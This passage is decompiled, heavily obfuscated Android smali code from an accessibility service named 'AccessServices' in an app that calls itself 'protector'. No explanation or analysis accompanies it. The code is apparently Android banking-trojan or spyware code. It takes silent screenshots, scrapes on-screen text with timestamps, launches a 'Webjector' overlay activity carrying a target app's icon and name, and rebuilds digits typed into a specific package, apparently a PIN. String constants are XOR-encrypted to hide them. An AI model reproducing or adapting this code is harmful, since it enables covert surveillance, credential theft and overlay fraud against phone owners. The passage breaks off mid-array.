    new-instance v1, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/b0;

    invoke-direct {v1, p0, p1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/b0;-><init>(Lcom/icontrol/protector/AccessServices;Landroid/content/Context;)V

    invoke-direct {v0, v1}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    iput-object v0, p0, Lcom/icontrol/protector/AccessServices;->k:Ljava/lang/Thread;

    invoke-virtual {v0}, Ljava/lang/Thread;->start()V

    return-void
.end method

.method private y(Landroid/content/Context;Ljava/lang/Class;)V
    .locals 2

    .line 1
    new-instance v0, Landroid/content/Intent;

    invoke-direct {v0, p1, p2}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    sget p2, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v1, 0x1a

    if-lt p2, v1, :cond_0

    invoke-static {p1, v0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v;->a(Landroid/content/Context;Landroid/content/Intent;)Landroid/content/ComponentName;

    goto :goto_0

    :cond_0
    invoke-virtual {p1, v0}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    :goto_0
    return-void
.end method

.method private z(Ljava/lang/String;)V
    .locals 9

    .line 1
    invoke-virtual {p0}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    invoke-static {v0, p1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/cg0;->r(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    new-instance v1, Ljava/io/File;

    invoke-virtual {p0}, Landroid/content/Context;->getFilesDir()Ljava/io/File;

    move-result-object v2

    invoke-direct {v1, v2, v0}, Ljava/io/File;-><init>(Ljava/io/File;Ljava/lang/String;)V

    invoke-virtual {v1}, Ljava/io/File;->exists()Z

    move-result v0

    if-eqz v0, :cond_0

    :try_start_0
    invoke-virtual {p0}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v0

    invoke-virtual {v0, p1}, Landroid/content/pm/PackageManager;->getApplicationIcon(Ljava/lang/String;)Landroid/graphics/drawable/Drawable;

    move-result-object v0
    :try_end_0
    .catch Landroid/content/pm/PackageManager$NameNotFoundException; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception v0

    invoke-virtual {v0}, Ljava/lang/Throwable;->printStackTrace()V

    const/4 v0, 0x0

    :goto_0
    const/16 v1, 0x90

    invoke-static {v0, v1, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/cg0;->p(Landroid/graphics/drawable/Drawable;II)Landroid/graphics/Bitmap;

    move-result-object v0

    :try_start_1
    new-instance v1, Ljava/io/ByteArrayOutputStream;

    invoke-direct {v1}, Ljava/io/ByteArrayOutputStream;-><init>()V
    :try_end_1
    .catch Ljava/io/IOException; {:try_start_1 .. :try_end_1} :catch_1

    :try_start_2
    sget-object v2, Landroid/graphics/Bitmap$CompressFormat;->PNG:Landroid/graphics/Bitmap$CompressFormat;

    const/16 v3, 0x64

    invoke-virtual {v0, v2, v3, v1}, Landroid/graphics/Bitmap;->compress(Landroid/graphics/Bitmap$CompressFormat;ILjava/io/OutputStream;)Z

    invoke-virtual {v1}, Ljava/io/ByteArrayOutputStream;->toByteArray()[B

    move-result-object v2

    invoke-virtual {p0}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v3

    invoke-virtual {p0}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v4

    invoke-static {v4, p1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/cg0;->s(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    new-instance v5, Landroid/content/Intent;

    const-class v6, Lcom/icontrol/protector/Webjector;

    invoke-direct {v5, v3, v6}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const/high16 v3, 0x10000000

    invoke-virtual {v5, v3}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    const/high16 v3, 0x40000000    # 2.0f

    invoke-virtual {v5, v3}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    const/4 v3, 0x5

    new-array v6, v3, [B

    fill-array-data v6, :array_0

    const/16 v7, 0x8

    new-array v8, v7, [B

    fill-array-data v8, :array_1

    invoke-static {v6, v8}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v5, v6, p1}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    new-array p1, v3, [B

    fill-array-data p1, :array_2

    new-array v3, v7, [B

    fill-array-data v3, :array_3

    invoke-static {p1, v3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object p1

    invoke-virtual {v5, p1, v4}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    const/4 p1, 0x4

    new-array v3, p1, [B

    fill-array-data v3, :array_4

    new-array v4, v7, [B

    fill-array-data v4, :array_5

    invoke-static {v3, v4}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v5, v3, v2}, Landroid/content/Intent;->putExtra(Ljava/lang/String;[B)Landroid/content/Intent;

    new-array p1, p1, [B

    fill-array-data p1, :array_6

    new-array v2, v7, [B

    fill-array-data v2, :array_7

    invoke-static {p1, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object p1

    const/4 v2, 0x1

    new-array v2, v2, [B

    const/4 v3, 0x0

    const/16 v4, -0x42

    aput-byte v4, v2, v3

    new-array v3, v7, [B

    fill-array-data v3, :array_8

    invoke-static {v2, v3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v5, p1, v2}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    invoke-virtual {p0, v5}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V
    :try_end_2
    .catchall {:try_start_2 .. :try_end_2} :catchall_0

    :try_start_3
    invoke-virtual {v1}, Ljava/io/ByteArrayOutputStream;->close()V
    :try_end_3
    .catch Ljava/io/IOException; {:try_start_3 .. :try_end_3} :catch_1

    goto :goto_3

    :catch_1
    move-exception p1

    goto :goto_2

    :catchall_0
    move-exception p1

    :try_start_4
    invoke-virtual {v1}, Ljava/io/ByteArrayOutputStream;->close()V
    :try_end_4
    .catchall {:try_start_4 .. :try_end_4} :catchall_1

    goto :goto_1

    :catchall_1
    move-exception v1

    :try_start_5
    invoke-virtual {p1, v1}, Ljava/lang/Throwable;->addSuppressed(Ljava/lang/Throwable;)V

    :goto_1
    throw p1
    :try_end_5
    .catch Ljava/io/IOException; {:try_start_5 .. :try_end_5} :catch_1

    :goto_2
    invoke-virtual {p1}, Ljava/lang/Throwable;->printStackTrace()V

    :goto_3
    if-eqz v0, :cond_0

    invoke-virtual {v0}, Landroid/graphics/Bitmap;->isRecycled()Z

    move-result p1

    if-nez p1, :cond_0

    invoke-virtual {v0}, Landroid/graphics/Bitmap;->recycle()V

    :cond_0
    return-void

    nop

    :array_0
    .array-data 1
        0x7et
        -0x4bt
        -0x4t
        0x54t
        -0x67t
    .end array-data

    nop

    :array_1
    .array-data 1
        0x1dt
        -0x40t
        -0x7at
        0x3dt
        -0x3t
        0x64t
        0x70t
        0x47t
    .end array-data

    :array_2
    .array-data 1
        0x31t
        -0x47t
        -0x3t
        -0x70t
        0x41t
    .end array-data

    nop

    :array_3
    .array-data 1
        0x5dt
        -0x28t
        -0x61t
        -0xbt
        0x2dt
        -0x7at
        -0x79t
        -0x4et
    .end array-data

    :array_4
    .array-data 1
        -0x2et
        -0x7dt
        -0x63t
        0x4et
    .end array-data

    :array_5
    .array-data 1
        -0x45t
        -0x20t
        -0xet
        0x20t
        -0x21t
        -0xft
        0x4t
        -0x7et
    .end array-data

    :array_6
    .array-data 1
        0x6et
        -0x38t
        -0x78t
        0x78t
    .end array-data

    :array_7
    .array-data 1
        0x1at
        -0x4ft
        -0x8t
        0x1dt
        0x3t
        0xet
        -0x3dt
        -0x4ft
    .end array-data

    :array_8
    .array-data 1
        -0x35t
        0x47t
        0x7ct
        -0x15t
        0x56t
        -0x62t
        -0xdt
        -0x2t
    .end array-data
.end method


# virtual methods
.method public A(I)V
    .locals 2

    .line 1
    :try_start_0
    invoke-virtual {p0}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    invoke-static {v0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/y;->a(Landroid/content/Context;)Ljava/util/concurrent/Executor;

    move-result-object v0

    new-instance v1, Lcom/icontrol/protector/AccessServices$c;

    invoke-direct {v1, p0}, Lcom/icontrol/protector/AccessServices$c;-><init>(Lcom/icontrol/protector/AccessServices;)V

    invoke-virtual {p0, p1, v0, v1}, Lcom/icontrol/protector/AccessServices;->takeScreenshotOfWindow(ILjava/util/concurrent/Executor;Landroid/accessibilityservice/AccessibilityService$TakeScreenshotCallback;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :catch_0
    return-void
.end method

.method public c(Landroid/content/Context;Ljava/lang/String;I)V
    .locals 2

    .line 1
    :try_start_0
    iget-object v0, p0, Lcom/icontrol/protector/AccessServices;->j:Ljava/util/concurrent/ThreadPoolExecutor;

    new-instance v1, Lcom/icontrol/protector/AccessServices$b;

    invoke-direct {v1, p0, p1, p3, p2}, Lcom/icontrol/protector/AccessServices$b;-><init>(Lcom/icontrol/protector/AccessServices;Landroid/content/Context;ILjava/lang/String;)V

    const/4 p1, 0x0

    invoke-virtual {p0, p1, v0, v1}, Lcom/icontrol/protector/AccessServices;->takeScreenshot(ILjava/util/concurrent/Executor;Landroid/accessibilityservice/AccessibilityService$TakeScreenshotCallback;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception p1

    invoke-virtual {p1}, Ljava/lang/Throwable;->printStackTrace()V

    :goto_0
    return-void
.end method

.method public d(Ljava/lang/String;ILandroid/view/accessibility/AccessibilityNodeInfo;)V
    .locals 8

    .line 1
    if-nez p3, :cond_0

    return-void

    :cond_0
    :try_start_0
    invoke-virtual {p3}, Landroid/view/accessibility/AccessibilityNodeInfo;->getText()Ljava/lang/CharSequence;

    move-result-object v0
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    const-string v1, ""

    if-eqz v0, :cond_1

    :try_start_1
    invoke-virtual {p3}, Landroid/view/accessibility/AccessibilityNodeInfo;->getText()Ljava/lang/CharSequence;

    move-result-object p3

    :goto_0
    invoke-interface {p3}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object p3

    goto :goto_1

    :cond_1
    invoke-virtual {p3}, Landroid/view/accessibility/AccessibilityNodeInfo;->getContentDescription()Ljava/lang/CharSequence;

    move-result-object v0

    if-eqz v0, :cond_2

    invoke-virtual {p3}, Landroid/view/accessibility/AccessibilityNodeInfo;->getContentDescription()Ljava/lang/CharSequence;

    move-result-object p3

    goto :goto_0

    :cond_2
    move-object p3, v1

    :goto_1
    const/4 v0, 0x1

    new-array v2, v0, [B

    const/16 v3, 0x6d

    const/4 v4, 0x0

    aput-byte v3, v2, v4

    const/16 v3, 0x8

    new-array v5, v3, [B

    fill-array-data v5, :array_0

    invoke-static {v2, v5}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {p3, v2, v1}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v2

    new-array v5, v0, [B

    const/16 v6, -0x58

    aput-byte v6, v5, v4

    new-array v6, v3, [B

    fill-array-data v6, :array_1

    invoke-static {v5, v6}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v2, v5, v1}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/String;->isEmpty()Z

    move-result v2

    if-nez v2, :cond_3

    invoke-virtual {v1}, Ljava/lang/String;->length()I

    move-result v1

    if-lez v1, :cond_3

    invoke-static {p2}, Lcom/icontrol/protector/a;->E(I)Ljava/lang/String;

    move-result-object p2

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v1

    new-instance v5, Ljava/text/SimpleDateFormat;

    const/16 v6, 0x13

    new-array v6, v6, [B

    fill-array-data v6, :array_2

    new-array v7, v3, [B

    fill-array-data v7, :array_3

    invoke-static {v6, v7}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v6

    invoke-static {}, Ljava/util/Locale;->getDefault()Ljava/util/Locale;

    move-result-object v7

    invoke-direct {v5, v6, v7}, Ljava/text/SimpleDateFormat;-><init>(Ljava/lang/String;Ljava/util/Locale;)V

    new-instance v6, Ljava/util/Date;

    invoke-direct {v6, v1, v2}, Ljava/util/Date;-><init>(J)V

    invoke-virtual {v5, v6}, Ljava/text/DateFormat;->format(Ljava/util/Date;)Ljava/lang/String;

    move-result-object v1

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v2, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    new-array p1, v0, [B

    const/16 v5, 0x3b

    aput-byte v5, p1, v4

    new-array v5, v3, [B

    fill-array-data v5, :array_4

    invoke-static {p1, v5}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object p1

    invoke-virtual {v2, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2, p2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    new-array p1, v0, [B

    const/16 p2, -0x38

    aput-byte p2, p1, v4

    new-array p2, v3, [B

    fill-array-data p2, :array_5

    invoke-static {p1, p2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object p1

    invoke-virtual {v2, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2, p3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    new-array p1, v0, [B

    const/16 p2, 0x44

    aput-byte p2, p1, v4

    new-array p2, v3, [B

    fill-array-data p2, :array_6

    invoke-static {p1, p2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object p1

    invoke-virtual {v2, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    new-instance p2, Lcom/icontrol/protector/AccessServices$a;

    invoke-direct {p2, p0, p1}, Lcom/icontrol/protector/AccessServices$a;-><init>(Lcom/icontrol/protector/AccessServices;Ljava/lang/String;)V

    invoke-virtual {p2}, Ljava/lang/Thread;->start()V

    invoke-virtual {p0}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object p2

    const/16 p3, 0x9

    new-array p3, p3, [B

    fill-array-data p3, :array_7

    new-array v0, v3, [B

    fill-array-data v0, :array_8

    invoke-static {p3, v0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object p3

    sget-object v0, Ljava/lang/Boolean;->FALSE:Ljava/lang/Boolean;

    invoke-static {p2, p3, v0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/nv;->b(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Boolean;)Ljava/lang/Boolean;

    move-result-object p2

    invoke-virtual {p2}, Ljava/lang/Boolean;->booleanValue()Z

    move-result p2

    if-eqz p2, :cond_3

    const/16 p2, 0xd

    new-array p2, p2, [B

    fill-array-data p2, :array_9

    new-array p3, v3, [B

    fill-array-data p3, :array_a

    invoke-static {p2, p3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    invoke-static {}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/nq;->b()Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/nq;

    move-result-object p2

    invoke-virtual {p2, p1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/nq;->a(Ljava/lang/String;)V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    :catch_0
    :cond_3
    return-void

    :array_0
    .array-data 1
        0x36t
        -0x3t
        -0x18t
        0x7ct
        -0x51t
        0x44t
        0x1et
        0x16t
    .end array-data

    :array_1
    .array-data 1
        -0xbt
        0x50t
        0x64t
        0x30t
        -0x33t
        0x47t
        0x3bt
        0x52t
    .end array-data

    :array_2
    .array-data 1
        0x12t
        -0x4ct
        -0x64t
        -0x7bt
        0x31t
        0xat
        -0xdt
        0x1at
        0xft
        -0x57t
        -0x3bt
        -0x4ct
        0x54t
        0x7dt
        -0x2dt
        0x5at
        0x51t
        -0x42t
        -0x6at
    .end array-data

    :array_3
    .array-data 1
        0x6bt
        -0x33t
        -0x1bt
        -0x4t
        0x1ct
        0x47t
        -0x42t
        0x37t
    .end array-data

    :array_4
    .array-data 1
        0x47t
        -0x7t
        -0x33t
        0x4at
        -0x63t
        0x59t
        -0x1et
        0x37t
    .end array-data

    :array_5
    .array-data 1
        -0x4ct
        -0x7et
        0x56t
        -0x42t
        0x1bt
        -0x43t
        0x52t
        0x79t
    .end array-data

    :array_6
    .array-data 1
        0x38t
        0x2et
        0x4bt
        -0x38t
        -0x67t
        -0x52t
        0x27t
        -0x36t
    .end array-data

    :array_7
    .array-data 1
        -0x3ft
        -0x24t
        0x49t
        0x21t
        -0x47t
        -0x42t
        0x1ct
        0x2t
        -0x36t
    .end array-data

    nop

    :array_8
    .array-data 1
        -0x73t
        -0x6bt
        0x1ft
        0x64t
        -0x1at
        -0xbt
        0x50t
        0x4dt
    .end array-data

    :array_9
    .array-data 1
        0x5ct
        -0x61t
        -0x49t
        0x54t
        0x6bt
        0x29t
        -0x52t
        -0x37t
        0x52t
        -0x6at
        -0x59t
        0x51t
        0x7at
    .end array-data

    nop

    :array_a
    .array-data 1
        0x37t
        -0x6t
        -0x32t
        0x27t
        0x1ft
        0x46t
        -0x24t
        -0x5et
    .end array-data
.end method

.method public k(Landroid/view/accessibility/AccessibilityEvent;)V
    .locals 6

    .line 1
    invoke-static {}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/ev;->a()I

    move-result v0

    const/4 v1, 0x3

    if-ne v0, v1, :cond_0

    return-void

    :cond_0
    :try_start_0
    invoke-direct {p0, p1}, Lcom/icontrol/protector/AccessServices;->j(Landroid/view/accessibility/AccessibilityEvent;)Z

    move-result v0

    if-eqz v0, :cond_1

    return-void

    :cond_1
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityRecord;->getSource()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    if-nez v0, :cond_2

    return-void

    :cond_2
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityEvent;->getEventType()I

    move-result v2

    const/4 v3, 0x1

    if-ne v2, v3, :cond_8

    const/16 v2, 0x14

    new-array v2, v2, [B

    fill-array-data v2, :array_0

    const/16 v4, 0x8

    new-array v5, v4, [B

    fill-array-data v5, :array_1

    invoke-static {v2, v5}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityEvent;->getPackageName()Ljava/lang/CharSequence;

    move-result-object p1

    invoke-virtual {v2, p1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p1

    if-eqz p1, :cond_8

    invoke-virtual {v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getViewIdResourceName()Ljava/lang/String;

    move-result-object p1

    invoke-direct {p0, p1}, Lcom/icontrol/protector/AccessServices;->l(Ljava/lang/String;)Z

    move-result p1
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    const/4 v2, 0x0

    const-string v5, ""

    if-eqz p1, :cond_5

    :try_start_1
    sget-object p1, Lcom/icontrol/protector/c;->c:Ljava/util/LinkedList;

    if-eqz p1, :cond_3

    invoke-virtual {p1}, Ljava/util/LinkedList;->clear()V

    goto :goto_0

    :catch_0
    move-exception p1

    goto/16 :goto_1

    :cond_3
    :goto_0
    invoke-virtual {v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getContentDescription()Ljava/lang/CharSequence;

    move-result-object p1

    if-eqz p1, :cond_4

    invoke-virtual {v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getContentDescription()Ljava/lang/CharSequence;

    move-result-object p1

    invoke-interface {p1}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v5
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    :cond_4
    :try_start_2
    invoke-static {v5}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result p1

    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    sget-object v5, Lcom/icontrol/protector/AccessServices;->R:Ljava/lang/String;

    invoke-virtual {v0, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0, p1}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    sput-object p1, Lcom/icontrol/protector/AccessServices;->R:Ljava/lang/String;

    sget-object p1, Lcom/icontrol/protector/AccessServices;->N:Lcom/icontrol/protector/AccessServices;

    new-array v0, v1, [B

    fill-array-data v0, :array_2

    new-array v1, v4, [B

    fill-array-data v1, :array_3

    invoke-static {v0, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    new-array v1, v3, [B

    const/4 v3, 0x7

    aput-byte v3, v1, v2

    new-array v2, v4, [B

    fill-array-data v2, :array_4

    invoke-static {v1, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-static {p1, v0, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/nv;->c(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_1

    goto :goto_2

    :cond_5
    const/16 p1, 0x25

    :try_start_3
    new-array p1, p1, [B

    fill-array-data p1, :array_5

    new-array v1, v4, [B

    fill-array-data v1, :array_6

    invoke-static {p1, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object p1

    invoke-virtual {v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getViewIdResourceName()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {p1, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p1

    if-nez p1, :cond_6

    const/16 p1, 0x23

    new-array p1, p1, [B

    fill-array-data p1, :array_7

    new-array v1, v4, [B

    fill-array-data v1, :array_8

    invoke-static {p1, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object p1

    invoke-virtual {v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getViewIdResourceName()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p1

    if-eqz p1, :cond_8

    :cond_6
    sget-object p1, Lcom/icontrol/protector/AccessServices;->R:Ljava/lang/String;

    invoke-virtual {p1}, Ljava/lang/String;->length()I

    move-result p1

    if-ne p1, v3, :cond_7

    sput-object v5, Lcom/icontrol/protector/AccessServices;->R:Ljava/lang/String;

    goto :goto_2

    :cond_7
    sget-object p1, Lcom/icontrol/protector/AccessServices;->R:Ljava/lang/String;

    invoke-virtual {p1}, Ljava/lang/String;->length()I

    move-result p1

    if-lez p1, :cond_8

    sget-object p1, Lcom/icontrol/protector/AccessServices;->R:Ljava/lang/String;

    invoke-virtual {p1}, Ljava/lang/String;->length()I

    move-result v0

    sub-int/2addr v0, v3

    invoke-virtual {p1, v2, v0}, Ljava/lang/String;->substring(II)Ljava/lang/String;

    move-result-object p1

    sput-object p1, Lcom/icontrol/protector/AccessServices;->R:Ljava/lang/String;
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_0

    goto :goto_2

    :goto_1
    invoke-virtual {p1}, Ljava/lang/Throwable;->printStackTrace()V

    :catch_1
    :cond_8
    :goto_2
    return-void

    nop

    :array_0
    .array-data 1
        0xct
        0x7ct
        -0x7ct
        -0x7ft
        -0x2et
        -0x1ft
